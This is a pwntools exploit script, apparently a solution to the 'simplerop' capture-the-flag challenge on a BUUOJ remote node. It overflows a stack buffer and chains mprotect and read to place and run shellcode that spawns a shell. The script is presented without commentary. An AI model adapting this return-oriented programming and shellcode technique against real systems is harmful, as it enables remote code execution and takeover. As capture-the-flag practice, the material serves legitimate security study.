from pwn import *

context.log_level = 'debug'

#p = process('./simplerop')
p = remote('node4.buuoj.cn', 29179)
elf = ELF('simplerop')

#gdb.attach(p, 'b *0x8048e6f')

mprotect = elf.sym['mprotect']
main_addr = elf.sym['main']
read_addr = elf.sym['read']

bss = 0x080EC000
bss_len = 0x2000

payload = b'a' * ( 0x14 + 4 + 4 + 4 ) + p32(mprotect) + p32(main_addr) + p32(bss) + p32(bss_len) + p32(7)

p.recvuntil('input :')
p.sendline(payload)

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

payload = b'a' * ( 0x14 + 4 ) + p32(read_addr) + p32(bss) + p32(0) + p32(bss) + p32(0x200)

p.recvuntil('input :')
p.sendline(payload)
p.sendline(shellcode)

p.interactive()
